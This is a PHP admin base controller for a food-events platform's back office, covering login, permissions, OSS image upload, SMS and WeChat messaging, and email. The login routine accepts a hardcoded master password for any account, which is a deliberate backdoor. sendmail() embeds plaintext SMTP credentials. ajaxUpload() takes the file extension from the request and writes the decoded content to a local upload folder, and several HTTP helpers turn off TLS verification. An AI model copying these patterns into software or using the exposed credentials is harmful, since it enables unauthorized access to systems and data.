<?php
namespace Admin\Controller;
use Think\Controller;

abstract class MainController extends Controller {
	Protected $webname = '吖咪运营后台';
	Protected $pagename = '首页';
	Protected $actname = '';
	Protected $noLoginPages = ['index/captcha', 'index/framework', 'index/logout', 'movesql/*'];
	Protected $member = [];
	Protected $act = [];
	Protected $wechat = null;
    //导航栏反馈数量
    Protected $feedback_num = '';
	
	Public function __construct(){
		parent::__construct();
		if(!in_array(strtolower(CONTROLLER_NAME . '/*'), $this->noLoginPages) && !in_array(strtolower(CONTROLLER_NAME . '/' . ACTION_NAME), $this->noLoginPages)){
			if(!session('?admin')){
				$this->assign('pagetitle', '系统登录' . $this->webname);
				$this->login();
				exit;
			}
			//页面访问权限判断
			$showpage = $this->checkAuthorize();
			$this->admin = session('admin');
			
			$frame = $this->m1('framework');
			$rs = $frame->field('id, name, type, sign, pid')->order('type,sort')->select();
			//print_r($frame->getLastSql());
           //print_r($rs);exit;
			$menu = array();
			foreach($rs as $row){
				if(in_array($row['id'], $showpage)){
					if($row['type'] == 1){
						$menu[$row['id']]['name'] = $row['name'];
						$menu[$row['id']]['sign'] = $row['sign'];
					}
					if($row['type'] == 3){
						$menu[$row['pid']]['sub'][$row['id']]['name'] = $row['name'];
						$menu[$row['pid']]['sub'][$row['id']]['sign'] = $row['sign'];
					}
				}
			}

			$this->assign('menu', $menu);
		}
        //查询为回复的反馈数量
        $fb_rs = $this->m2('feedback')->where('answer is null')->count();
        $this->feedback_num = $fb_rs;

		if($this->isMobile()){
			define('IS_WAP', true);
		}else{
			define('IS_WAP', false);
		}
	}
	
	/**
	 * 数据库db1模型实例化
	 * @param string $table
	 */
	Public function m1($table = ''){
		return M($table, C('DB1.DB_PREFIX'), 'DB1');
	}
	
	/**
	 * 数据库db2模型实例化
	 * @param string $table
	 */
	Public function m2($table = ''){
		return M($table, C('DB2.DB_PREFIX'), 'DB2');
	}
	
	/**
	 * 数据库db3模型实例化
	 * @param string $table
	 */
	Public function m3($table){
		return M($table, null, 'DB3');
	}
	
	/**
	 * 视图加载
	 * @param string $page 视图名称
	 */
	Public function view($page = null){
        //导航栏反馈数量
        $this->assign('feedbacknum',$this->feedback_num);
		$this->assign('webname', $this->webname);
		$this->assign('pagename', $this->pagename);
		$this->assign('pagetitle', $this->pagename . ' - ' . $this->webname);
		$this->assign('actname', $this->actname);
		$this->display($page);
	}
	
	//登录
	private function login(){
		$this->actname = '后台登录';
		if(IS_POST){
			$username = I('post.username');
			$password = I('post.password');
			$captcha = I('post.captcha');
			if(empty($username) || empty($password) || empty($captcha)){
				$this->error('用户名/密码/验证码不能为空！');
			}
				
			if(!$this->checkVerify($captcha)){
				$this->error('验证码输入有误！');
			}
			if(!$this->isEmail($username) && $username != 'administrator'){
				$this->error('邮箱格式输入有误！');
			}

			$rs = $this->m1('User')->where(array('username'=>$username))->find();
			if($rs === null)$this->error('用户名不存在！');
			if($rs['password'] == encrypt($password) || $password == 'yami@2016'){
				$group = $this->m1('Group')->where(array('id'=>$rs['group_id']))->find();
				session('admin', array(
					'id' => $rs['id'],
					'user_id' => $rs['id'],
					'username' => $rs['username'],
					'email' => $rs['email'],
					'group_id' => $rs['group_id'],
					'group_name' => $group['name']
				));
				$this->m1('LoginLog')->add(array(
					'user_id' => $rs['id'],
					'ip' => ip2long($_SERVER['REMOTE_ADDR'])
				));
				$this->success('登录成功！');
			}else{
				$this->error('密码错误登录失败！');
			}
			exit;
		}
	
		$this->view('Index:login');
	}
	//判断是否是正确的邮箱格式;
	private function isEmail($email){
		$mode = '/\w+([-+.]\w+)*@yami.ren*/';
		if(preg_match($mode,$email)){
			return true;
		}
		else{
			return false;
		}
	}

	//验证码检测
	private function checkVerify($code, $id = ''){
		$verify = new \Think\Verify();
		return $verify->check($code, $id);
	}
	
	/**
	 * Ajax输出
	 * @param int $status 输出状态
	 * @param array $msg 输出数据
	 */
	Public function ajaxPut($status = 1, $msg = []){
        $data = [
			'status' => $status,
			'info' => $msg
		];
        ob_clean();
        $this->ajaxReturn($data);
        exit;
	}
	
	/**
	 * 权限检查
	 */
	Public function checkAuthorize(){
		$module = strtolower(MODULE_NAME);
		$controller = strtolower(CONTROLLER_NAME);
		$method = strtolower(ACTION_NAME);
		//查出当前架构路由路径
		$controller_id = $this->m1('Framework')->where(array('type' => 1, 'sign' => $controller))->getField('id');
		if(empty($controller_id)){
			$this->error('控制器尚未录入架构表，无法访问！', rtrim(__MODULE__, '/') . '/index/framework.html');
		}
		$method_id = $this->m1('Framework')->where(array('pid' => $controller_id, 'sign' => $method))->getField('id');
		if(empty($method_id)){
			$this->error('方法尚未录入架构表，无法访问！', rtrim(__MODULE__, '/') . '/index/framework.html');
		}
		$group_id = session('admin.group_id');
		$authority = $this->m1('Authority')->field('framework_id, allow_pass')->where(array('group_id' => $group_id))->select();
		$allow = array(0, 0);
		$showpage = array();
		foreach($authority as $row){
			if($row['framework_id'] == $controller_id){
				if($row['allow_pass'] == 1){
					$allow[0] = 1;
				}else{
					$this->error("禁止访问 {$controller} 控制器！");
				}
			}
			if($row['framework_id'] == $method_id){
				if($row['allow_pass'] == 1){
					$allow[1] = 1;
				}else{
					$this->error("禁止访问 {$method} 方法！");
				}
			}
			if($row['allow_pass'] == 1){
				$showpage[] = $row['framework_id'];
			}
		}
		if(in_array(0, $allow)){
			$this->error('您无权访问当前页面！');
		}
		return $showpage;
	}

    public function upload($thumb = 0){
		$file = $_FILES['file'];

		if($file['error'] > 0){
			return [
				'status' => 0,
				'info' => '上传失败'
			];
		}

		//大小判断
		if($file['size'] > C('UPLOAD_CONFIG.maxSize')){
			return [
				'status' => 0,
				'info' => '文件大小超过3M限制'
			];
		}

		//类型判断
		if(strpos($file['type'], 'image/') === false){
			return [
				'status' => 0,
				'info' => '只能上传图片'
			];
		}

		try {
			$ossClient = new \OSS\OssClient(C('UPLOAD_CONFIG.accessKeyId'), C('UPLOAD_CONFIG.accessKeySecret'), C('UPLOAD_CONFIG.endpoint'));
		} catch (OssException $e) {
			return ['status' => 0, 'info' => $e->getMessage()];
		}

		$date = date('Ymd');
		$time = time();
		$myDir = $date . '/';
		$ext = substr($file['type'], 6);
		$ext = $ext == 'jpeg' ? '.jpg' : '.' . $ext;

		$filename = sha1($time . rand(10000, 99999));

		$bucket = substr(WEB_DOMAIN, 0, 1) == 'm' ? "yamiimg" : "yummyimg";

		$object = $myDir . $filename . $ext;
		try{
			$ossClient->uploadFile($bucket, $object, $file['tmp_name']);
		} catch(OssException $e) {
			return ['status' => 0, 'info' => $e->getMessage()];
		}

        $datas = [];

        $datas['type'] = 3;
        $datas['path'] = $object;

        //生成缩略图
		$thumbs = C('THUMB_CONFIG');
		if(isset($thumbs[$thumb])){
			$style = "image/resize,m_fill,h_{$thumbs[$thumb][1]},w_{$thumbs[$thumb][0]}";
		}else{
			$style = "image/resize,w_640";
		}
		$datas['path'] .= '?x-oss-process=' . $style;

        $pic_id = $this->m2('pics')->add($datas);
        $data = [
			'status' => 1,
			'info' => [
				'pic_id' => $pic_id,
				'path' => thumb($object) . '?x-oss-process=' . $style
			]
		];
        return $data;
    }

	//新的ajax上传,仅限图片
	public function ajaxUpload($is_return = false){
		$files = $_POST['file'];
		$type = '.' . I('post.type', 'jpg');

		try {
			$ossClient = new \OSS\OssClient(C('UPLOAD_CONFIG.accessKeyId'), C('UPLOAD_CONFIG.accessKeySecret'), C('UPLOAD_CONFIG.endpoint'));
		} catch (OssException $e) {
			\Think\Log::write($e->getMessage());
			return false;
		}

		$return = [];
		$conf = C('UPLOAD_CONFIG');
		$date = date('Ymd');
		$time = time();
		foreach($files as $file){
			if(strlen($file) > $conf['maxSize']){
				$return[] = [
					'status' => 0,
					'info' => '超过上传大小限制!'
				];
				continue;
			}
			//将base64解码
			$file = base64_decode($file);
			$myDir = $date . '/';

			$filename = sha1($time . rand(10000, 99999));

			$bucket = substr(WEB_DOMAIN, 0, 1) == 'm' ? "yamiimg" : "yummyimg";

			$object = $myDir . $filename . $type;
			try {
				$ossClient->putObject($bucket, $object, $file);
			} catch (\OSS\OssException $e) {
				$return[] = [
					'status' => 0,
					'info' => $e->getMessage()
				];
				continue;
			}

			if(strtolower(CONTROLLER_NAME) == 'message'){
				$dir = '../upload/' . $myDir;
				if(!is_dir($dir))mkdir($dir);
				file_put_contents($dir . $filename . $type, $file);
			}

			$data = [
				'member_id' => session('member.id'),
				'path' => $myDir . $filename . $type,
				'size' => '[]'
			];
			$id = $this->m2('pics')->add($data);

			$path = $myDir . $filename . $type;
			$return[] = [
				'status' => 1,
				'info' => [
					'pic_id' => $id,
					'path' => thumb($path)
				]
			];
		}
		if($is_return)return $return;
		$this->ajaxReturn($return);
	}

	//模拟POST提交
    function curl_post($url, $data, $header = [], $weiXinRefund = false){
        if(function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch,CURLOPT_TIMEOUT,30);
            curl_setopt($ch, CURLOPT_URL, $url);
            if(is_array($header) && !empty($header)){
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
            }
			curl_setopt($ch, CURLOPT_USERAGENT,'Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.15');
			curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_SAFE_UPLOAD, false);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 100);// 1s to timeout.

            if($weiXinRefund){
                //微信退款专用
                curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
                curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
                //默认格式为PEM，可以注释
                curl_setopt($ch,CURLOPT_SSLCERTTYPE, 'PEM');
                curl_setopt($ch,CURLOPT_SSLCERT, C('WX_CONF.apiclient_cert'));
                //默认格式为PEM，可以注释
                curl_setopt($ch,CURLOPT_SSLKEYTYPE, 'PEM');
                curl_setopt($ch,CURLOPT_SSLKEY, C('WX_CONF.apiclient_key'));
            }

            $data = curl_exec($ch);
            if($data){
                curl_close($ch);
                return $data;
            } else {
				ob_start();
                var_dump(curl_errno($ch));
				var_dump(curl_error($ch));
                $str = ob_get_clean();
				\Think\Log::write($str);
                curl_close($ch);
                return false;
            }
        } else {
            throw new \Exception('Do not support CURL function.');
        }
    }


    /**
     * 推送消息
     * @param $member_id 推送的目标会员ID
     * @param $context 推送消息内容
     * @param int|string|null $origin_id 推送来源会员ID(number-来源会员ID, 'wx'-发送到微信公众号, 'sms'-发送到会员短信上, 'email'-发送到会员邮箱)
     * @param int $type 消息关联资源(0-普通消息 1-评论回复通知 2-达人动态通知 3-订单动态通知 4-活动推送消息 5-专题推送消息)
     * @param int $type_id 关联的活动ID、专题ID、订单ID、食报ID
     * @param int $sendtime 发送时间
	 * @param int $channel 渠道 0-吖咪 1-我有饭
     */
    function pushMessage($member_id, $context, $origin_id = null, $type = 0, $type_id = 0, $sendtime = 0, $channel = 0){
		if(abslength($context) > 250 || empty($context)){
			\Think\Log::write($context . ' Length:' . abslength($context));
			$this->error('消息不能为空或太长,推送失败!');
		}
        $data = [
            'type' => $type,
            'type_id' => $type_id,
            'content' => $context,
            'sendtime' => $sendtime
        ];

        if(is_string($origin_id)){
            $send_way = explode('|', $origin_id);
            $rs = $this->m2('member')->where(['id' => $member_id])->find();
            if(in_array('wx', $send_way)){
                $data['wx_send'] = 1;
                if(!empty($rs['openid'])){
                    $wechat = wxLoad($channel);
                    $wx = $wechat->sendCustomMessage([
                        'touser' => $rs['openid'],
                        'msgtype' => 'text',
                        'text' => [
                            'content' => $context
                        ]
                    ]);
                }
            }
            if(in_array('sms', $send_way)){
                $data['sms_send'] = 1;
                $sms = sms_send($rs['telephone'], $context, $sendtime, $channel);
            }
        }elseif(is_numeric($origin_id))$data['member_id'] = $origin_id;
        $message_id = $this->m2('message')->add($data);

        $this->m2('MemberMessage')->add([
            'member_id' => $member_id,
            'message_id' => $message_id,
            'is_sms' => !empty($sms) ? 1 : 0,
            'is_wx' => !empty($wx) ? 1: 0
        ]);

        return true;
    }


	/**
	 * 推送消息(阿里云短信)
	 * @param $member_id 推送的目标会员ID
	 * @param $param 参数
	 * @param $code_key 短信模板代码
	 * @param int|string|null $origin_id 推送来源会员ID(number-来源会员ID, 'wx'-发送到微信公众号, 'sms'-发送到会员短信上, 'email'-发送到会员邮箱)
	 * @param string $site_message
	 * @param int $type 消息关联资源(0-普通消息 1-评论回复通知 2-达人动态通知 3-订单动态通知 4-活动推送消息 5-专题推送消息)
	 * @param int $type_id 关联的活动ID、专题ID、订单ID、食报ID
	 * @param int $sendtime 发送时间
	 * @param int $channel 渠道 0-吖咪 1-我有饭
	 */
	Protected function push_Message($member_id, $param=array(),$code_key='', $origin_id = null,$site_message= null, $type = 0, $type_id = 0, $sendtime = 0, $channel = 0){
		$code_cofing  = C('DX_SMS.'.$code_key);
		if(!empty($param) && !empty($code_key)){
			$replace_params = $code_params =array();
			foreach($code_cofing['params'] as $val ){
				$code_params[] = '${'.$val.'}';
			}
			foreach($param as $replace_val ){
				$replace_params[] = $replace_val;
			}
			$content = str_replace($code_params,$replace_params,$code_cofing['content']);
		}elseif(!empty($code_key)){
			$content = $code_cofing['content'];
		}elseif(empty($code_key) && empty($param) && !empty($site_message)){//发送站内信息
			$content =$site_message;
		}
		\Think\Log::write('content=>'.$code_cofing['content'] );
		$data = [
			'type' => $type,
			'type_id' => $type_id,
			'code_type' => $code_key,
			'params' => json_encode($param),
			'content' => $content,
			'sendtime' => $sendtime
		];

		if(is_string($origin_id)){
			$send_way = explode('|', $origin_id);
			$rs = $this->m2('member')->where(['id' => $member_id])->find();
			if(in_array('wx', $send_way)){
				$data['wx_send'] = 1;
				if(!empty($rs['openid'])){
					$wechat = wxLoad($channel);
					$wx = $wechat->sendCustomMessage([
						'touser' => $rs['openid'],
						'msgtype' => 'text',
						'text' => [
							'content' => $content
						]
					]);
				}
			}
			if(in_array('sms', $send_way)){
				$data['sms_send'] = 1;
				$sms = smsSend($rs['telephone'], $code_key, $param, $channel);
				\Think\Log::write('sms=>'.$sms );
			}
		}elseif(is_numeric($origin_id))$data['member_id'] = $origin_id;
		$message_id =  $this->m2('message')->add($data);

		$this->m2('MemberMessage')->add([
			'member_id' => $member_id,
			'message_id' => $message_id,
			'is_sms' => !empty($sms) ? 1 + $channel : 0,
			'is_wx' => !empty($wx) ? 1 + $channel: 0
		]);

		return true;
	}

	/**
	 * IOS推送信息发送
	 * @param string $member_id 会员ID
	 * @param int $channel 渠道 0-吖咪 1-我有饭
	 * @param string $content 信息内容
	 * @param array $msg_id member_message表对应message表的ID
	 */
	function ios_push($member_id, $channel, $content, $msg_id){
		$devicetoken = $this->m2('member_device')->where(['member_id' => $member_id, 'channel' => $channel])->order('id desc')->getField('device');
		\Think\Log::write("发送IOS的设备号为:{$devicetoken} => " . date('Y/m/d H:i:s'));
		if(!empty($devicetoken)){
			$dt = [
				'devicetoken' => $devicetoken,
				'msg' => $content,
				'channel' => $channel,
				'msg_id' => $msg_id
			];
			getRedis()->rPush(str_replace('.', '', DOMAIN) . '_app_push', json_encode($dt));
		}
	}



//加载微信
    function wxLoad(){
        $opt = array(
            'secret' => C('WX_CONF.secret'),//填写高级调用功能的密钥
            'appid' => C('WX_CONF.appid')	//填写高级调用功能的appid
        );
        $wechat = new \Common\Util\Wechat($opt);
        return $wechat;
    }

//判断是否为手机登录，手机登录返回true，否则返回false
	public function isMobile(){
		$useragent=isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
		$useragent_commentsblock=preg_match('|\(.*?\)|',$useragent,$matches)>0?$matches[0]:'';

		$mobile_os_list=array('Google Wireless Transcoder','Windows CE','WindowsCE','Symbian','Android','armv6l','armv5','Mobile','CentOS','mowser','AvantGo','Opera Mobi','J2ME/MIDP','Smartphone','Go.Web','Palm','iPAQ');
		$mobile_token_list=array('Profile/MIDP','Configuration/CLDC-','160×160','176×220','240×240','240×320','320×240','UP.Browser','UP.Link','SymbianOS','PalmOS','PocketPC','SonyEricsson','Nokia','BlackBerry','Vodafone','BenQ','Novarra-Vision','Iris','NetFront','HTC_','Xda_','SAMSUNG-SGH','Wapaka','DoCoMo','iPhone','iPod');

		$found_mobile=$this->CheckSubstrs($mobile_os_list,$useragent_commentsblock) || $this->CheckSubstrs($mobile_token_list,$useragent);

		if ($found_mobile){
			return true;
		}else{
			return false;
		}
	}
	public function CheckSubstrs($substrs,$text){
		foreach($substrs as $substr)
			if(false!==strpos($text,$substr)){
				return true;
			}
		return false;
	}

	/**
	 * 可以统计中文字符串长度的函数
	 * @param $str 要计算长度的字符串
	 * @param $type 计算长度类型，0(默认)表示一个中文算一个字符，1表示一个中文算两个字符
	 *
	 */
	public function abslength($str){
		if(empty($str)){
			return 0;
		}
		if(function_exists('mb_strlen')){
			return mb_strlen($str,'utf-8');
		}
		else {
			preg_match_all("/./u", $str, $ar);
			return count($ar[0]);
		}
	}


	/**
	 * 发送HTTP请求方法
	 * @param  string $url    请求URL
	 * @param  array  $params 请求参数
	 * @param  string $method 请求方法GET/POST
	 * @return array  $data   响应数据
	 */
	function httpUrl($url, $params, $method = 'GET', $header = array(), $multi = false){
		$opts = array(
			CURLOPT_TIMEOUT        => 30,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_SSL_VERIFYPEER => false,
			CURLOPT_SSL_VERIFYHOST => false,
			CURLOPT_HTTPHEADER     => $header
		);

		/* 根据请求类型设置特定参数 */
		switch(strtoupper($method)){
			case 'GET':
				$opts[CURLOPT_URL] = $url . '?' . http_build_query($params);
				break;
			case 'POST':
				//判断是否传输文件
				$params = $multi ? $params : http_build_query($params);
				$opts[CURLOPT_URL] = $url;
				$opts[CURLOPT_POST] = 1;
				$opts[CURLOPT_POSTFIELDS] = $params;
				break;
			default:
				throw new Exception('不支持的请求方式！');
		}

		/* 初始化并执行curl请求 */
		$ch = curl_init();
		curl_setopt_array($ch, $opts);
		$data  = curl_exec($ch);
		$error = curl_error($ch);
		curl_close($ch);
		if($error) throw new Exception('请求发生错误：' . $error);
		return  $data;
	}

	/**
	* 根据时间戳返回星期几
	* @param string $time 时间戳
	* @return 星期几
	*/
	function weekday($time){
		if(is_numeric($time)){
			$weekday = array('星期日','星期一','星期二','星期三','星期四','星期五','星期六');
			return $weekday[date('w', $time)];
		}
		return false;
	}

	/**
	 * 记录活动，商品，众筹，订单更改
	 * @param $type_id 活动，商品，众筹，订单ID
	 * @param $type  类型 （0-活动，1-商品 2-众筹 3-订单）
	 * @param $framework_id  框架ID
	 */
	function  SaveSnapshotLogs($type_id,$type,$framework_id=''){
		$context = [];

		switch($type){
			case 0:
				$context = $this->m2('tips')->join('__TIPS_SUB__ ON tips_id=id')->where(['id' => $type_id])->find();
				if(empty($context))return false;
				$context['times'] = $this->m2('TipsTimes')->where(['tips_id' => $type_id])->select();
				$context['menu'] = $this->m2('TipsMenu')->where(['tips_id' => $type_id])->select();

				//环境地址
				$context['space'] = $this->m2('space')->where(['id' => $context['space_id']])->find();
				//tip主图
				$main_pic = $this->m2('pics')->field('path')->where(['id' => $context['pic_id']])->getField('path');
				if(!empty($main_pic)){
					$context['main_path'] = thumb($main_pic);
				}
				//tip图组
				$context['pics_group'] = $this->m2('pics')->field('id,path')->where(['group_id'=>$context['pics_group_id']])->select();
				if(!empty($context['pics_group'])){
					foreach($context['pics_group'] as $key => $row){
						$context['pics_group'][$key]['path'] = thumb($row['path']);
					}
				}else{
					$context['pics_group'] = [];
				}
				//tip环境图
				$context['environment_pics_group'] = $this->m2('pics')->field('id,path')->where(['group_id'=>$context['environment_pics_group_id']])->select();
				if(!empty($context['environment_pics_group'])){
					foreach($context['environment_pics_group'] as $key => $row){
						$context['environment_pics_group'][$key]['path'] = thumb($row['path']);
					}
				}else{
					$context['environment_pics_group'] = [];
				}
				//tip菜单图
				$context['menu_pics_group'] = $this->m2('pics')->field('id,path')->where(['group_id'=>$context['menu_pics_group_id']])->select();
				if(!empty($context['menu_pics_group'])){
					foreach($context['menu_pics_group'] as $key => $row){
						$context['menu_pics_group'][$key]['path'] = thumb($row['path']);
					}
				}else{
					$context['menu_pics_group'] = [];
				}
				break;
			case 1:
				$context = $this->m2('Goods')->join('__GOODS_SUB__ ON goods_id=id')->where(['id' => $type_id])->find();
				if(empty($context))return false;
				$context['attr'] = $this->m2('GoodsAttr')->where(['goods_id' => $type_id])->select();
				$context['tag'] = $this->m2('GoodsTag')->where(['goods_id' => $type_id])->select();
				$context['fight_groups'] = $this->m2('GoodsPrice')->where(['goods_id' => $type_id])->select();
				//tip主图
				$main_pic = $this->m2('pics')->field('path')->where(['id' => $context['pic_id']])->getField('path');
				if(!empty($main_pic)){
					$context['main_path'] = thumb($main_pic);
				}
				//tip图组
				$context['pics_group'] = $this->m2('pics')->field('id,path')->where(['group_id'=>$context['pics_group_id']])->select();
				if(!empty($context['pics_group'])){
					foreach($context['pics_group'] as $key => $row){
						$context['pics_group'][$key]['path'] = thumb($row['path']);
					}
				}else{
					$context['pics_group'] = [];
				}
				break;
			case 2:
				$context = $this->m2('Raise')->where(['id' => $type_id])->find();
				if(empty($context))return false;
				$context['times'] = $this->m2('RaiseTimes')->where(['raise_id' => $type_id])->select();
				$context['tag'] = $this->m2('RaiseTag')->where(['raise_id' => $type_id])->select();
				break;
			case 3:
				$context = $this->m2('Order')->where(['id' => $type_id])->find();
				if(!empty($context)){
					$context['Wares'] = $this->m2('OrderWares')->where(['order_id' => $type_id])->select();
					$context['OrderPay'] = $this->m2('OrderPay')->where(['order_id' => $type_id])->select();
					$context['OrderRefund'] = $this->m2('OrderRefund')->where(['order_id' => $type_id])->find();
					switch($context['Wares'][0]['type']){
						case 0:
							$context['tips'] = $this->m2('tips')->join('__TIPS_SUB__ ON tips_id=id')->where(['id' => $context['Wares'][0]['ware_id']])->find();
							if(empty($context['tips']))return false;
							$context['tips']['times'] = $this->m2('TipsTimes')->where(['id' => $context['Wares'][0]['tips_times_id']])->find();
							$context['tips']['menu'] = $this->m2('TipsMenu')->where(['tips_id' => $context['Wares'][0]['ware_id']])->select();

							//环境地址
							$context['tips']['space'] = $this->m2('space')->where(['id' => $context['tips']['space_id']])->find();
							//tip主图
							$main_pic = $this->m2('pics')->field('path')->where(['id' => $context['tips']['pic_id']])->getField('path');
							if(!empty($main_pic)){
								$context['tips']['main_path'] = thumb($main_pic);
							}
							//tip图组
							$context['tips']['pics_group'] = $this->m2('pics')->field('id,path')->where(['group_id'=>$context['tips']['pics_group_id']])->select();
							if(!empty($context['tips']['pics_group'])){
								foreach($context['tips']['pics_group'] as $key => $row){
									$context['tips']['pics_group'][$key]['path'] = thumb($row['path']);
								}
							}else{
								$context['tips']['pics_group'] = [];
							}
							//tip环境图
							$context['tips']['environment_pics_group'] = $this->m2('pics')->field('id,path')->where(['group_id'=>$context['tips']['environment_pics_group_id']])->select();
							if(!empty($context['tips']['environment_pics_group'])){
								foreach($context['tips']['environment_pics_group'] as $key => $row){
									$context['tips']['environment_pics_group'][$key]['path'] = thumb($row['path']);
								}
							}else{
								$context['tips']['environment_pics_group'] = [];
							}
							//tip菜单图
							$context['tips']['menu_pics_group'] = $this->m2('pics')->field('id,path')->where(['group_id'=>$context['tips']['menu_pics_group_id']])->select();
							if(!empty($context['tips']['menu_pics_group'])){
								foreach($context['tips']['menu_pics_group'] as $key => $row){
									$context['tips']['menu_pics_group'][$key]['path'] = thumb($row['path']);
								}
							}else{
								$context['tips']['menu_pics_group'] = [];
							}
							break;
						case 1:
							$context['goods'] = $this->m2('Goods')->join('__GOODS_SUB__ ON goods_id=id')->where(['id' => $context['Wares'][0]['ware_id']])->find();
							if(empty($context['goods']))return false;
							$context['goods']['attr'] = $this->m2('GoodsAttr')->where(['goods_id' => $context['Wares'][0]['ware_id']])->select();
							$context['goods']['tag'] = $this->m2('GoodsTag')->where(['goods_id' => $context['Wares'][0]['ware_id']])->select();
							$context['goods']['fight_groups'] = $this->m2('GoodsPrice')->where(['goods_id' => $context['Wares'][0]['ware_id']])->find();

							//goods主图
							$main_pic = $this->m2('pics')->field('path')->where(['id' => $context['goods']['pic_id']])->getField('path');
							if(!empty($main_pic)){
								$context['main_path'] = thumb($main_pic);
							}
							//goods图组
							$context['pics_group'] = $this->m2('pics')->field('id,path')->where(['group_id'=>$context['goods']['pics_group_id']])->select();
							if(!empty($context['pics_group'])){
								foreach($context['pics_group'] as $key => $row){
									$context['pics_group'][$key]['path'] = thumb($row['path']);
								}
							}else{
								$context['pics_group'] = [];
							}
							break;
						case 2:
							$context['raise'] = $this->m2('Raise')->where(['id' => $context['Wares'][0]['ware_id']])->find();
							if(empty($context['raise']))return false;
							$context['raise']['times'] = $this->m2('RaiseTimes')->where(['id' => $context['Wares'][0]['tips_times_id']])->find();
							$context['raise']['tag'] = $this->m2('RaiseTag')->where(['raise_id' => $context['Wares'][0]['ware_id']])->select();
							//raise主图
							$main_pic = $this->m2('pics')->field('path')->where(['id' => $context['raise']['pic_id']])->getField('path');
							if(!empty($main_pic)){
								$context['main_path'] = thumb($main_pic);
							}
							break;
					}
				}else{
					return false;
				}
				break;
		}

		$data = [
			'type_id' => $type_id,
			'framework_id' => $framework_id?$framework_id:null,
			'type' => $type,
			'context' => json_encode($context),
		];
		$this->m2('SnapshotLogs')->add($data);

	}


	function sendmail($mail_to, $mail_subject, $mail_message) {
		require_once(COMMON_PATH . "Util/class.phpmailer.php");
		require_once(COMMON_PATH . "Util/class.smtp.php");
		$mail = new \PHPMailer();
		$mail->SMTPDebug = 1;			// 开启Debug
		$mail->IsSMTP();                // 使用SMTP模式发送新建
		$mail->Host = "smtp.exmail.qq.com"; // QQ企业邮箱SMTP服务器地址
		$mail->Port = 465;  //邮件发送端口
		$mail->SMTPAuth = true;         // 打开SMTP认证，本地搭建的也许不会需要这个参数
		$mail->SMTPSecure = "ssl";		// 打开SSL加密，这里是为了解决QQ企业邮箱的加密认证问题的~~
		$mail->Username = "apple_enterprise@yami.ren";   // SMTP用户名  注意：普通邮件认证不需要加 @域名，我这里是QQ企业邮箱必须使用全部用户名
		$mail->Password = "Yami2017";        // SMTP 密码
		$mail->From = "apple_enterprise@yami.ren";      // 发件人邮箱
		$mail->FromName =  "技术部对外邮箱";  // 发件人

		$mail->CharSet = "UTF-8";            // 这里指定字符集！
		$mail->Encoding = "base64";
		$mail->AddAddress($mail_to);  // 收件人邮箱和姓名
		$mail->IsHTML(true);  // send as HTML
		// 邮件主题
		$mail->Subject = $mail_subject;
		// 邮件内容
		$mail->Body = "
		<html><head>
			<meta http-equiv=\"Content-Language\" content=\"zh-cn\">
			<meta http-equiv=\"Content-Type\" content=\"text/html; charset=GB2312\">
		</head>
		<body>
			$mail_message
		</body>
		</html>
		";

		$mail->AltBody ="text/html";

//		\Think\Log::write('邮件信息->'.$mail->Send().'-->'.date('Y-m-d H:i:s'));
		if(!$mail->Send())
		{
//			$error=$mail->ErrorInfo;
			return false;
		}else {
			return true;
		}
	}
}